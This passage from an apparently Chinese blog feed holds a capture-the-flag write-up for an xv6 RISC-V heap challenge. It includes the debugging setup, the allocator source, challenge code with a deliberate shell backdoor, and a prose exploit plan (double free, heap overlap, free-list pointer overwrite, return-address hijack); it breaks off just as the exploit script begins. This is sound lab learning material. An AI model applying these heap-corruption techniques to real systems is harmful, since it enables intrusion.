pwn篇》</code>,发现里面的内容确实基础和简单，不过当时买回来看的时候感觉在看天书，真属于是不会时看天书，会时用不上了<br>里面的很多堆利用手法都过时了，不过感觉依然可以作为一本很好很系统的<code>pwn</code>入门书籍，期末后看看能不能找到想学<code>pwn</code>的学弟，把这本书送他并天天督促他学<code>pwn</code>(已经有一位学<code>web</code>的学弟成为受害者了)，好书不能浪费(其实是怕以后没人带&gt;_&lt;)</p><h1 id="2024-1-1"><a href="#2024-1-1" class="headerlink" title="2024&#x2F;1&#x2F;1"></a>2024&#x2F;1&#x2F;1</h1><p>2023年过的太失败了，2024给我冲！！！我要变强！！！</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>记一道risc-v架构xv6操作系统的堆</title>
      <link href="/2023/11/18/%E8%AE%B0%E4%B8%80%E9%81%93risc-v%E6%9E%B6%E6%9E%84xv6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%A0%86/"/>
      <url>/2023/11/18/%E8%AE%B0%E4%B8%80%E9%81%93risc-v%E6%9E%B6%E6%9E%84xv6%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E7%9A%84%E5%A0%86/</url>
      
        <content type="html"><![CDATA[<p>附件：<a href="https://github.com/Qanux/uheap">https://github.com/Qanux/uheap</a><br>这是一道<code>133nson</code>师兄出的题(太强啦),看了后只能说自己的见识还是太少了。<br>这一道是<code>xv6</code>系统的堆题，附件已经给出了一个完整的<code>qemu</code>环境，只要输入<code>./run.sh</code>即可启动程序<br>题目有一个<code>hint</code>文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">This challenge is running on the xv6 system. (Attention: its heap allocator is different from GLIBC)</span><br><span class="line">You can get the xv6 source files on https://github.com/mit-pdos/xv6-riscv</span><br><span class="line">You can run this challenge locally using the command &#x27;./run.sh&#x27; and your goal is to PWN the binary chal</span><br><span class="line">To make things simple, the binary file is compiled with debug_info and I have left its source code in chal.c. This means you can use qemu and gdb-multiarch(or other debuggers) for source level debugging if necessary. (You just need to add &#x27;-S -gdb tcp::26000&#x27; to the qemu parameter in the file run.sh then you can start gdb for local debugging)</span><br><span class="line">Here are some useful gdb commands. You can write them in the file .gdbinit and start gdb with the command &#x27;gdb-multiarch -x .gdbinit&#x27;</span><br><span class="line"></span><br><span class="line">target remote:26000</span><br><span class="line">set architecture riscv:rv64</span><br><span class="line">file chal</span><br><span class="line">set disassemble-next-line on</span><br><span class="line">layout src</span><br><span class="line"></span><br><span class="line">If you have any problem about the remote environment, please contact the admin. Have fun!</span><br></pre></td></tr></table></figure><p>由于<code>elf</code>文件是附带调试信息编译的，这大大方便了我们进行动态调试</p><h3 id="如何调试"><a href="#如何调试" class="headerlink" title="如何调试"></a>如何调试</h3><p>相信很多萌新还不知道怎么进行调试，这里就进行傻瓜式教学<br>首先在<code>github</code>上面下载<code>umalloc.c</code>文件(<code>hint</code>文件上写明了)，然后将该文件放入在和<code>chal</code>同一个路径下<br>然后将<code>run.sh</code>文件中的内容进行修改</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">LD_LIBRARY_PATH=./depend exec ./qemu-system-riscv64 \</span><br><span class="line">        -machine virt \</span><br><span class="line">        -bios none \</span><br><span class="line">        -kernel kernel \</span><br><span class="line">        -m 256M \</span><br><span class="line">        -smp 3 \</span><br><span class="line">        -nographic \</span><br><span class="line">        -drive file=fs.img,if=none,format=raw,id=x0 \</span><br><span class="line">        -device virtio-blk-device,drive=x0,bus=virtio-mmio-bus.0 \</span><br><span class="line">        -monitor /dev/null \</span><br><span class="line">        -S -gdb tcp::26000</span><br></pre></td></tr></table></figure><p>此时通过<code>./run.sh</code>来启动，然后再重新打开另外一个终端，进入到<code>chal</code>文件的路径下，通过<code>gdb-multiarch</code>，然后依次输入下面的命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">target remote:26000</span><br><span class="line">set architecture riscv:rv64</span><br><span class="line">file chal</span><br><span class="line">set disassemble-next-line on</span><br><span class="line">layout src</span><br><span class="line">b main</span><br><span class="line">c</span><br></pre></td></tr></table></figure><p>此时即可进行调试，不过我们不能向平时一样通过<code>bin</code>、<code>stack</code>这些指令来查看堆内存(其实我也不知道怎么看，请求大佬指教)，不过x<code>/16gx</code> 这一些基础的指令还是可以使用</p><h3 id="xv6堆管理分析"><a href="#xv6堆管理分析" class="headerlink" title="xv6堆管理分析"></a>xv6堆管理分析</h3><p>首先来看看<code>xv6</code>中的堆块长什么样</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> Align;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">header</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">union</span> <span class="title">header</span> *<span class="title">ptr</span>;</span></span><br><span class="line">        uint size;</span><br><span class="line">    &#125; s;</span><br><span class="line">    Align x;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>可以看到堆块的结构和我们平时<code>glibc</code>中的不一样，他没有<code>prev_size</code>，取而代之的是堆块的指针，我们可以猜到这个指针因该和我们的<code>fd</code>指针类似(储存在<code>free</code>后的链表中的下一个<code>free</code>的堆块的堆头的位置)<br>umalloc.c(<a href="https://github.com/mit-pdos/xv6-riscv">https://github.com/mit-pdos/xv6-riscv</a>)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/param.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Memory allocator by Kernighan and Ritchie,</span></span><br><span class="line"><span class="comment">// The C programming Language, 2nd ed.  Section 8.7.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">long</span> Align;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">union</span> <span class="title">header</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">header</span> *<span class="title">ptr</span>;</span></span><br><span class="line">    uint size;</span><br><span class="line">  &#125; s;</span><br><span class="line">  Align x;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span> <span class="title">header</span> <span class="title">Header</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> Header base;</span><br><span class="line"><span class="type">static</span> Header *freep;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span></span><br><span class="line"><span class="title function_">free</span><span class="params">(<span class="type">void</span> *ap)</span></span><br><span class="line">&#123;</span><br><span class="line">  Header *bp, *p;</span><br><span class="line"></span><br><span class="line">  bp = (Header*)ap - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span>(p = freep; !(bp &gt; p &amp;&amp; bp &lt; p-&gt;s.ptr); p = p-&gt;s.ptr)</span><br><span class="line">    <span class="keyword">if</span>(p &gt;= p-&gt;s.ptr &amp;&amp; (bp &gt; p || bp &lt; p-&gt;s.ptr))</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">if</span>(bp + bp-&gt;s.size == p-&gt;s.ptr)&#123;</span><br><span class="line">    bp-&gt;s.size += p-&gt;s.ptr-&gt;s.size;</span><br><span class="line">    bp-&gt;s.ptr = p-&gt;s.ptr-&gt;s.ptr;</span><br><span class="line">  &#125; <span class="keyword">else</span></span><br><span class="line">    bp-&gt;s.ptr = p-&gt;s.ptr;</span><br><span class="line">  <span class="keyword">if</span>(p + p-&gt;s.size == bp)&#123;</span><br><span class="line">    p-&gt;s.size += bp-&gt;s.size;</span><br><span class="line">    p-&gt;s.ptr = bp-&gt;s.ptr;</span><br><span class="line">  &#125; <span class="keyword">else</span></span><br><span class="line">    p-&gt;s.ptr = bp;</span><br><span class="line">  freep = p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> Header*</span><br><span class="line"><span class="title function_">morecore</span><span class="params">(uint nu)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *p;</span><br><span class="line">  Header *hp;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(nu &lt; <span class="number">4096</span>)</span><br><span class="line">    nu = <span class="number">4096</span>;</span><br><span class="line">  p = sbrk(nu * <span class="keyword">sizeof</span>(Header));</span><br><span class="line">  <span class="keyword">if</span>(p == (<span class="type">char</span>*)<span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  hp = (Header*)p;</span><br><span class="line">  hp-&gt;s.size = nu;</span><br><span class="line">  <span class="built_in">free</span>((<span class="type">void</span>*)(hp + <span class="number">1</span>));</span><br><span class="line">  <span class="keyword">return</span> freep;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>*</span><br><span class="line"><span class="title function_">malloc</span><span class="params">(uint nbytes)</span></span><br><span class="line">&#123;</span><br><span class="line">  Header *p, *prevp;</span><br><span class="line">  uint nunits;</span><br><span class="line"></span><br><span class="line">  nunits = (nbytes + <span class="keyword">sizeof</span>(Header) - <span class="number">1</span>)/<span class="keyword">sizeof</span>(Header) + <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span>((prevp = freep) == <span class="number">0</span>)&#123;</span><br><span class="line">    base.s.ptr = freep = prevp = &amp;base;</span><br><span class="line">    base.s.size = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span>(p = prevp-&gt;s.ptr; ; prevp = p, p = p-&gt;s.ptr)&#123;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;s.size &gt;= nunits)&#123;</span><br><span class="line">      <span class="keyword">if</span>(p-&gt;s.size == nunits)</span><br><span class="line">        prevp-&gt;s.ptr = p-&gt;s.ptr;</span><br><span class="line">      <span class="keyword">else</span> &#123;</span><br><span class="line">        p-&gt;s.size -= nunits;</span><br><span class="line">        p += p-&gt;s.size;</span><br><span class="line">        p-&gt;s.size = nunits;</span><br><span class="line">      &#125;</span><br><span class="line">      freep = prevp;</span><br><span class="line">      <span class="keyword">return</span> (<span class="type">void</span>*)(p + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(p == freep)</span><br><span class="line">      <span class="keyword">if</span>((p = morecore(nunits)) == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们侧重看一下堆块大小的计算</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nunits = (nbytes + <span class="keyword">sizeof</span>(Header) - <span class="number">1</span>)/<span class="keyword">sizeof</span>(Header) + <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>大概就是原本的堆块大小减一加上一个堆头结构的大小后除以堆头的大小再向上取整（比如申请<code>0x19</code>大小的堆块计算出的<code>size</code>为<code>3</code>，申请<code>0x30</code>的堆块计算出的<code>size</code>为<code>4</code>）</p><h4 id="malloc函数"><a href="#malloc函数" class="headerlink" title="malloc函数"></a>malloc函数</h4><p>在<code>malloc</code>函数中，先根据申请的堆块计算出相应的堆块大小，若<code>free</code>链表的表头为<code>0</code>（<code>free</code>链表尚未初始化，则会将静态全局变量<code>base</code>的地址赋值给<code>free</code>的表头指针<code>freep</code>）。然后会从<code>prevp-&gt;s.ptr</code>（表头后的第一个堆块指针）开始顺着<code>s.ptr</code>遍历<code>free</code>链表，若遇到比待申请的堆块大小大的堆块，则会直接切分该堆块，将前一部分返回，后一部分留在链表内；若遇到<code>size</code>刚好符合需求的，则将其脱链后直接返回；若遍历完整个链表仍未遇到可以进行分配的<code>free</code>堆块，则会调用<code>morecore</code>函数向系统申请更多的内存。</p><h4 id="free函数"><a href="#free函数" class="headerlink" title="free函数"></a>free函数</h4><p>在<code>free</code>函数中，会先遍历<code>free</code>链表，若途中遇到待释放的堆块地址处于链表中的两个<code>free</code>堆块之间的话，则会提前退出，否则等待链表被遍历完一轮之后退出（实际上该链表为一个单向循环链表）。然后检查该堆块是否有前&#x2F;后向相邻的<code>free</code>堆块，若有则进行前&#x2F;后向合并，若无则将其直接插入到<code>free</code>链表中。</p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>查看保护机制</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">or4nge@圈圈:/mnt/d/desktop/uheap$ checksec chal</span><br><span class="line">[!] Did not find any GOT entries</span><br><span class="line">[*] &#x27;/mnt/d/desktop/uheap/chal&#x27;</span><br><span class="line">    Arch:     riscv64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>只开启的<code>NX enabled</code>(<code>133nson</code>：“送分题”)<br>出题人比较友好，直接给出了题目源码<br>chal.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/types.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/stat.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;user/user.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *arr[<span class="number">4</span>];</span><br><span class="line"><span class="type">void</span> *record;</span><br><span class="line"><span class="type">int</span> chance = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">banner</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;         __\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;  __  __/ /_  ___  ____ _____\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot; / / / / __ \\/ _ \\/ __ `/ __ \\\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;/ /_/ / / / /  __/ /_/ / /_/ /\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\\__,_/_/ /_/\\___/\\__,_/ .___/\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;                     /_/\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">menu</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1. add\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;2. delete\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;3. ???\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">readline</span><span class="params">(<span class="type">char</span> *buf, <span class="type">int</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">read(<span class="number">1</span>, &amp;buf[i], <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(buf[i] == <span class="string">&#x27;\x0a&#x27;</span>)&#123;</span><br><span class="line">buf[i] = <span class="string">&#x27;\x00&#x27;</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">add</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> size;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line"><span class="keyword">if</span> (size &lt; <span class="number">0</span> || size &gt; <span class="number">0x50</span>)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> idx;</span><br><span class="line"><span class="keyword">for</span> (idx = <span class="number">0</span>; idx &lt; <span class="number">4</span>; idx++)</span><br><span class="line"><span class="keyword">if</span> (arr[idx] == <span class="number">0</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">if</span> (idx == <span class="number">4</span>)</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">arr[idx] = <span class="built_in">malloc</span>(size);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;content: &quot;</span>);</span><br><span class="line">readline(arr[idx], size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">int</span> idx;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;index: &quot;</span>);</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;idx);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (idx &gt;= <span class="number">0</span> &amp;&amp; idx &lt; <span class="number">4</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (arr[idx]) &#123;</span><br><span class="line"><span class="built_in">free</span>(arr[idx]);</span><br><span class="line"><span class="keyword">if</span> (chance)</span><br><span class="line">record = arr[idx];</span><br><span class="line">arr[idx] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">char</span> *argv[] = &#123;<span class="string">&quot;sh&quot;</span>, <span class="number">0</span>&#125;;</span><br><span class="line">exec(<span class="string">&quot;sh&quot;</span>, argv);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">gift</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (chance) &#123;</span><br><span class="line"><span class="keyword">if</span> (record)</span><br><span class="line"><span class="built_in">free</span>(record);</span><br><span class="line">record = <span class="number">0</span>;</span><br><span class="line">chance = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">banner();</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> choice;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">menu();</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;choice);</span><br><span class="line"><span class="keyword">switch</span> (choice) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">add();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">delete();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">gift();</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目给出的<code>backdoor</code>，而且<code>gitf</code>函数则是直接送了一次<code>double free</code><br>但是我们不能直接<code>double free</code>，主要有两个原因：</p><ul><li>观察到<code>free</code>函数前面会有一个循环遍历</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(p = freep; !(bp &gt; p &amp;&amp; bp &lt; p-&gt;s.ptr); p = p-&gt;s.ptr)</span><br><span class="line">  <span class="keyword">if</span>(p &gt;= p-&gt;s.ptr &amp;&amp; (bp &gt; p || bp &lt; p-&gt;s.ptr))</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>如果直接<code>double free</code>会直接在这里进入死循环</p><ul><li><code>ptr</code>指针在<code>heap</code>的头部前<code>8</code>个字节，直接<code>double free</code>并不能对起做任何修改</li></ul><p>所以可以选择叠堆后造成堆溢出才有机会修改<code>ptr</code>指针</p><p>因为这里的堆块合并条件非常简单，所以造堆叠也很简单，先<code>free</code>两个相邻的堆块让他们合并（下文称这两个堆块中低地址的堆块为<code>a</code>，高地址的为<code>b</code>），合并后表头<code>freep</code>变为刚刚释放的<code>a</code>，然后<code>double free</code>堆块<code>b</code>，这个时候因为表头是<code>a</code>，所以第一次循环就满足 <code>if(p &gt;= p-&gt;s.ptr &amp;&amp; (bp &gt; p || bp &lt; p-&gt;s.ptr))</code> 的条件退出循环，这时又因为<code>b</code>与之前<code>a</code>不相邻（合并后堆块<code>a</code>的<code>size</code>已被修改为合并后的大小），所以不会触发合并，而是将<code>b</code>直接链入链表。现在只需要将<code>a</code>申请出来，就可以堆叠到<code>b</code>进行非法写入修改<code>free</code>链表上堆块<code>b</code>的<code>s.ptr</code>。因为之前合并的时候<code>freep</code>被赋值为了堆块<code>a</code>，而<code>malloc</code>遍历是从<code>freep-&gt;s.ptr</code>开始遍历的，为了简化利用模型，可以再<code>free</code>一个低于以上两个且不相邻的堆块来更新<code>freep</code>，将<code>freep-&gt;s.ptr</code>变成堆块<code>a</code>，然后下次<code>malloc</code>的时候就会从<code>a</code>开始遍历。这时申请出<code>size</code>为<code>a+b</code>堆块就可以把之前的<code>a</code>申请出来，利用堆叠写<code>b-&gt;s.ptr</code>为目标地址<code>addr</code>，再连续分配两次（先要把<code>b</code>给申请出来），<code>malloc</code>就会尝试将<code>addr</code>分配出去，这时如果<code>addr</code>合法（地址合法且<code>size</code>符合要求）就会返回<code>addr</code>，到这一步就完成了容易地址分配<br>至于分配到哪，因为程序是静态链接的，没<code>got</code>表可打，没动态库中的<code>hook</code>和<code>glibc</code>中的经典<code>io</code>可打，也没什么现成的函数指针可以利用。所以考虑分配到栈上劫持返回地址到后门，因为系统没有<code>ASLR</code>功能（其实出题人出到一半看到了一篇<code>xv6</code>实现<code>ASLR</code>功能的论文，但因为时间比较仓促所以没有把<code>ASLR</code>加上了，也算是变相降低了难度吧），可以通过调试找到固定的栈帧地址来劫持<code>add</code>函数的返回地址。最后就是因为<code>malloc</code>函数中要<code>size</code>满足要求才能将目标地址<code>addr</code>分配出去，所以这里可以考虑利用<code>add</code>函数的局部栈上变量<code>size</code>和<code>idx</code>来构造合法的<code>size</code>将<code>addr</code>分配出去，这里用的是<code>idx</code>（<code>idx</code>最后为<code>3</code>，可以通过 <code>malloc(0x20)</code> 分配）</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td 